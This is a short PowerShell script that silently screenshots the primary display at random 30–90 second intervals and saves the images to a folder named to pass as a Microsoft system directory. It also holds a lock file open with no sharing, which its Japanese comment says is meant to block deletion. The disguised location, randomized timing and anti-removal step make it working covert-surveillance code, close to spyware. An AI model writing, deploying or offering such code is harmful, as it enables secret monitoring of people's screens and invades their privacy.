Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class DPIAwareness {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
[DPIAwareness]::SetProcessDPIAware() | Out-Null

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$saveDir = "$env:APPDATA\Microsoft\CaptureSystem"

# ファイルを「共有なし」で開き続け、削除を物理的に阻止する
$lockFile = Join-Path $saveDir ".sys_lock"
$lockStream = [System.IO.File]::Open($lockFile, 'OpenOrCreate', 'Read', 'None')

try {
    while ($true) {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $bmp.Save("$saveDir\img_$timestamp.jpg", [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        $graphics.Dispose()
        $bmp.Dispose()

        Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
    }
}
finally {
    if ($null -ne $lockStream) {
        $lockStream.Close()
        $lockStream.Dispose()
    }
}